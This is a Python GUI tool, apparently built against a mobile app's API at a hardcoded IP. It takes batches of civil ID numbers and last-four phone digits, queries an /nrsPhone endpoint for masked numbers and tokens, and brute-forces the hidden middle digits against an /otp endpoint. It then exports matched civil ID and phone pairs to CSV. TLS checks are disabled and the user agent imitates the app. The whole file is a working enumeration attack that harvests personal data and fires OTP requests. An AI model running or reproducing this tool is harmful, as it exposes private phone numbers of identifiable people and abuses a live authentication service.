import concurrent.futures
import csv
import json
import re
import threading
import time
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import requests
import urllib3

# Disable insecure HTTPS warnings for IP-based endpoints
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ROPFullTool:

    def __init__(self, root):
        self.root = root
        self.root.title("📱 ROP Batch File & Multi-Number Match Tool")
        self.root.geometry("1100x980")
        self.root.configure(bg="#1e1e1e")
        self.session = requests.Session()
        self.session.verify = False

        self.token_lock = threading.Lock()
        self.host = "5.37.58.147"

        self.otp_results = []
        self.unmatched_results = []
        self.is_running = False
        self.stop_requested = False

        self.setup_ui()
        self.load_default_cookies_and_headers()

    def load_default_cookies_and_headers(self):
        sample_header = (
            f"POST /nrsPhone HTTP/1.1\nHost: {self.host}\nContent-Type:"
            " application/json"
        )
        self.burp_entry.insert(tk.END, sample_header)
        self.status_label.config(text="✅ READY", fg="#00ff88")
        self.token_status.config(
            text="Multi-Number Sequential Checking Enabled!"
        )

    def parse_header(self):
        burp_text = self.burp_entry.get("1.0", tk.END).strip()
        if not burp_text:
            messagebox.showerror("Error", "Pehle Header paste karein!")
            return

        host_match = re.search(r"Host:\s*([^\r\n\s]+)", burp_text, re.IGNORECASE)
        if host_match:
            self.host = host_match.group(1).strip()
            self.bearer_entry.delete(0, tk.END)
            self.bearer_entry.insert(0, self.host)

        self.status_label.config(text="✅ READY", fg="#00ff88")
        self.token_status.config(text="Header Updated Successfully!")
        self.log(f"✅ Header re-parsed successfully. Host: {self.host}\n")

    def fetch_fresh_token_for_civil_id(self, civil_id):
        host_val = self.bearer_entry.get().strip()
        if host_val:
            self.host = host_val

        with self.token_lock:
            url = f"https://{self.host}/nrsPhone"
            payload = {"civilId": civil_id}
            headers = self.get_headers()

            # Retry mechanism for timeout/network lags (Attempts: 2)
            for attempt in range(2):
                if self.stop_requested:
                    return False, {}
                try:
                    resp = self.session.post(
                        url, json=payload, headers=headers, timeout=15
                    )
                    resp_text = resp.text.strip()
                    self.root.after(
                        0, lambda d=resp_text: self.log(f"📥 Civil ID Response: {d}\n")
                    )

                    data = json.loads(resp_text)
                    if "mobile" in data and data["mobile"]:
                        return True, data
                    return False, data
                except requests.exceptions.Timeout:
                    if attempt == 0:
                        self.root.after(0, lambda: self.log(f"⚠️ Timeout for {civil_id}, retrying... ({attempt+1}/2)\n"))
                        time.sleep(1)
                    else:
                        self.root.after(0, lambda: self.log(f"❌ Connection Timed Out for Civil ID: {civil_id}\n"))
                except Exception as e:
                    self.root.after(
                        0,
                        lambda err=str(e): self.log(
                            f"❌ Error fetching mobile data: {err}\n"
                        ),
                    )
                    break
            return False, {}

    def load_batch_file(self):
        file_path = filedialog.askopenfilename(
            title="Select Batch File",
            filetypes=[("Text / CSV Files", "*.txt *.csv"), ("All Files", "*.*")],
        )
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    self.batch_entry.delete("1.0", tk.END)
                    self.batch_entry.insert(tk.END, content)
                    self.log(f"📁 Batch file loaded successfully: {file_path}\n")
            except Exception as e:
                messagebox.showerror(
                    "Error", f"File load karne mein masla aaya: {str(e)}"
                )

    def run_batch_search(self):
        if self.is_running:
            messagebox.showwarning("Busy", "Process already running!")
            return

        batch_text = self.batch_entry.get("1.0", tk.END).strip()
        if not batch_text:
            messagebox.showerror(
                "Error", "Pehle batch data enter karein ya file load karein!"
            )
            return

        lines = batch_text.split("\n")
        tasks_list = []
        seen_ids = set()

        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = re.split(r"[,;\s]+", line)
            if len(parts) >= 2:
                cid = parts[0].strip()
                last4 = parts[1].strip()
                if (
                    cid.isdigit()
                    and last4.isdigit()
                    and len(last4) == 4
                    and cid not in seen_ids
                ):
                    seen_ids.add(cid)
                    tasks_list.append((cid, last4))

        if not tasks_list:
            messagebox.showerror(
                "Error", "Koi valid format nahi mila! Sahi format: CivilID, Last4Digits"
            )
            return

        self.is_running = True
        self.stop_requested = False
        self.status_label.config(text="🔄 Running Batch Search...", fg="#00ff88")
        self.log(
            f"🚀 Starting Batch Search for {len(tasks_list)} Unique Civil ID(s)...\n"
        )

        threading.Thread(
            target=self._worker_batch_search, args=(tasks_list,), daemon=True
        ).start()

    def _worker_batch_search(self, tasks_list):
        try:
            idx = 0
            total = len(tasks_list)

            while idx < total and not self.stop_requested:
                civil_id, suffix = tasks_list[idx]

                self.root.after(
                    0,
                    lambda c=civil_id, i=idx + 1, t=total: self.log(
                        f"\n--- Processing [{i}/{t}] Civil ID: {c} (Last 4: {suffix}) ---\n"
                    ),
                )

                time.sleep(0.5)
                success, data = self.fetch_fresh_token_for_civil_id(civil_id)
                if not success or not data:
                    self.root.after(
                        0,
                        lambda c=civil_id: self.log(
                            f"❌ Failed to fetch data for {c}, skipping to next...\n"
                        ),
                    )
                    self.unmatched_results.append(
                        {"civil_id": civil_id, "last_four": suffix}
                    )
                    idx += 1
                    continue

                mobile_dict = data.get("mobile", {})
                civil_id_token = data.get("civilId", "")

                if not mobile_dict:
                    self.unmatched_results.append(
                        {"civil_id": civil_id, "last_four": suffix}
                    )
                    idx += 1
                    continue

                matched_in_this_id = False

                for masked_num, token_val in mobile_dict.items():
                    if self.stop_requested or matched_in_this_id:
                        break

                    clean_digits = re.sub(r"\D", "", masked_num)
                    if len(clean_digits) < 2:
                        continue

                    prefix = clean_digits[:2]
                    self.root.after(
                        0,
                        lambda p=prefix, m=masked_num, c=civil_id: self.log(
                            f"⚡ Testing Mask: {m} (Prefix: {p}) with range 00-99 for Civil ID: {c}\n"
                        ),
                    )

                    # Auto generate 00 to 99 numbers combination
                    for i in range(100):
                        if self.stop_requested or matched_in_this_id:
                            break
                        
                        middle_digits = f"{i:02d}"
                        phone = f"{prefix}{middle_digits}{suffix}"

                        time.sleep(0.15)
                        if self._test_single_phone_fast(civil_id, phone, token_val, civil_id_token):
                            matched_in_this_id = True
                            break

                if not matched_in_this_id and not self.stop_requested:
                    self.unmatched_results.append(
                        {"civil_id": civil_id, "last_four": suffix}
                    )
                    self.root.after(
                        0,
                        lambda c=civil_id: self.log(
                            f"⚠️ Number not matched for Civil ID: {c}\n"
                        ),
                    )

                idx += 1

        except Exception as e:
            self.root.after(0, lambda: self.log(f"❌ Batch Error: {str(e)}\n"))
        finally:
            self.root.after(0, self.done)

    def _test_single_phone_fast(
        self, civil_id, phone, token_val, civil_id_token
    ):
        if self.stop_requested:
            return False

        try:
            url = f"https://{self.host}/otp"
            payload = {"mobile": {phone: token_val}, "civilId": civil_id_token}
            headers = self.get_headers()

            resp = self.session.post(
                url, json=payload, headers=headers, timeout=10
            )
            resp_text = resp.text.strip()

            if resp_text and "token" in resp_text and "id" in resp_text:
                self.otp_results.append({"civil_id": civil_id, "phone": phone})
                self.root.after(0, self.update_table)
                self.root.after(
                    0,
                    lambda p=phone, cid=civil_id: self.log(
                        f"🎯 MATCH FOUND: Civil ID -> {cid} | Phone -> {p}\n"
                    ),
                )
                return True
        except Exception:
            pass
        return False

    def export_csv(self):
        if not self.otp_results:
            messagebox.showwarning("Warning", "Koi data available nahi hai!")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")],
        )
        if file_path:
            try:
                with open(file_path, mode="w", newline="", encoding="utf-8") as f:
                    writer = csv.writer(f)
                    writer.writerow(["Civil ID", "Phone Number"])
                    for r in self.otp_results:
                        writer.writerow([r["civil_id"], r["phone"]])
                messagebox.showinfo("Success", "Data CSV mein export ho gaya!")
            except Exception as e:
                messagebox.showerror("Error", f"Masla aaya: {str(e)}")

    def export_unmatched_csv(self):
        if not self.unmatched_results:
            messagebox.showwarning("Warning", "Koi unmatched data available nahi hai!")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            title="Save Not Match Numbers",
            filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")],
        )
        if file_path:
            try:
                with open(file_path, mode="w", newline="", encoding="utf-8") as f:
                    writer = csv.writer(f)
                    writer.writerow(["Civil ID", "Last 4 Digits"])
                    for r in self.unmatched_results:
                        writer.writerow([r["civil_id"], r["last_four"]])
                messagebox.showinfo("Success", "Not Match Numbers CSV mein save ho gaye!")
            except Exception as e:
                messagebox.showerror("Error", f"Masla aaya: {str(e)}")

    def get_headers(self):
        return {
            "host": self.host,
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "Dart/3.9 (dart:io)",
        }

    def done(self):
        self.is_running = False
        self.status_label.config(text="Completed", fg="#00ff88")

    def stop_process(self):
        self.stop_requested = True
        self.status_label.config(text="Stopped", fg="#ffaa00")

    def update_table(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        for r in self.otp_results:
            self.tree.insert("", "end", values=(r["civil_id"], r["phone"]))

    def log(self, msg):
        self.console.insert(tk.END, msg)
        self.console.see(tk.END)

    def clear_all(self):
        self.otp_results.clear()
        self.unmatched_results.clear()
        self.update_table()
        self.console.delete("1.0", tk.END)

    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg="#1e1e1e")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)

        hf = tk.LabelFrame(
            main_frame,
            text="Request Header / Host",
            bg="#2d2d2d",
            fg="white",
            font=("Arial", 10, "bold"),
        )
        hf.pack(fill=tk.X, pady=2)
        self.burp_entry = scrolledtext.ScrolledText(
            hf, height=2, bg="#1a1a1a", fg="#00ff41"
        )
        self.burp_entry.pack(fill=tk.X, padx=5, pady=2)
        tk.Button(
            hf,
            text="REFRESH/PARSE HEADER",
            command=self.parse_header,
            bg="#00ff88",
            font=("Arial", 9, "bold"),
        ).pack(pady=2)
        self.token_status = tk.Label(hf, text="", fg="#ff4444", bg="#2d2d2d")
        self.token_status.pack()

        baf = tk.LabelFrame(
            main_frame,
            text="Batch Search (CivilID, Last4Digits per line)",
            bg="#2d2d2d",
            fg="white",
            font=("Arial", 10, "bold"),
        )
        baf.pack(fill=tk.X, pady=3)

        self.batch_entry = scrolledtext.ScrolledText(
            baf, height=4, bg="#1a1a1a", fg="#00ff88", font=("Consolas", 10)
        )
        self.batch_entry.pack(fill=tk.X, padx=5, pady=3)
        self.batch_entry.insert(tk.END, "5701982, 1944\n")

        br_frame = tk.Frame(baf, bg="#2d2d2d")
        br_frame.pack(fill=tk.X, pady=3)

        tk.Button(
            br_frame,
            text="📁 LOAD BATCH FILE",
            command=self.load_batch_file,
            bg="#00aa88",
            fg="white",
            font=("Arial", 9, "bold"),
        ).pack(side=tk.LEFT, padx=5)
        tk.Button(
            br_frame,
            text="🚀 START BATCH SEARCH",
            command=self.run_batch_search,
            bg="#ffaa00",
            fg="black",
            font=("Arial", 9, "bold"),
        ).pack(side=tk.LEFT, padx=5)
        tk.Button(
            br_frame,
            text="STOP",
            command=self.stop_process,
            bg="#ff3333",
            fg="white",
            font=("Arial", 9, "bold"),
        ).pack(side=tk.LEFT, padx=5)

        self.status_label = tk.Label(
            br_frame, text="Idle", fg="#00ff88", bg="#2d2d2d", font=("Arial", 9, "bold")
        )
        self.status_label.pack(side=tk.LEFT, padx=10)

        r2 = tk.Frame(baf, bg="#2d2d2d")
        r2.pack(fill=tk.X, pady=2)
        tk.Label(
            r2,
            text="API Target Host:",
            fg="#00ff88",
            bg="#2d2d2d",
            font=("Arial", 9, "bold"),
        ).pack(side=tk.LEFT, padx=5)
        self.bearer_entry = tk.Entry(r2, width=65, bg="#1a1a1a", fg="white")
        self.bearer_entry.pack(side=tk.LEFT, padx=5)
        self.bearer_entry.insert(0, "5.37.58.147")

        tf = tk.LabelFrame(
            main_frame,
            text="Matched Results Table",
            bg="#2d2d2d",
            fg="white",
            font=("Arial", 10, "bold"),
        )
        tf.pack(fill=tk.BOTH, expand=True, pady=3)

        self.tree = ttk.Treeview(
            tf, columns=("CivilID", "Phone"), show="headings", height=5
        )
        self.tree.heading("CivilID", text="Civil ID")
        self.tree.column("CivilID", width=200, anchor="center")
        self.tree.heading("Phone", text="Phone Number")
        self.tree.column("Phone", width=200, anchor="center")
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=3)

        bf = tk.Frame(main_frame, bg="#1e1e1e")
        bf.pack(fill=tk.X, pady=2)
        tk.Button(
            bf,
            text="EXPORT TO CSV",
            command=self.export_csv,
            bg="#00aa88",
            fg="white",
            font=("Arial", 9, "bold"),
        ).pack(side=tk.LEFT, padx=5)
        tk.Button(
            bf,
            text="NOT MATCH NUMBER",
            command=self.export_unmatched_csv,
            bg="#aa5500",
            fg="white",
            font=("Arial", 9, "bold"),
        ).pack(side=tk.LEFT, padx=5)
        tk.Button(
            bf, text="CLEAR", command=self.clear_all, bg="#ff4444", fg="white", font=("Arial", 9, "bold")
        ).pack(side=tk.LEFT, padx=5)

        self.console = scrolledtext.ScrolledText(
            main_frame, height=6, bg="#0a0a0a", fg="#00ff41"
        )
        self.console.pack(fill=tk.X, pady=3)


def main():
    root = tk.Tk()
    app = ROPFullTool(root)
    root.mainloop()


if __name__ == "__main__":
    main()
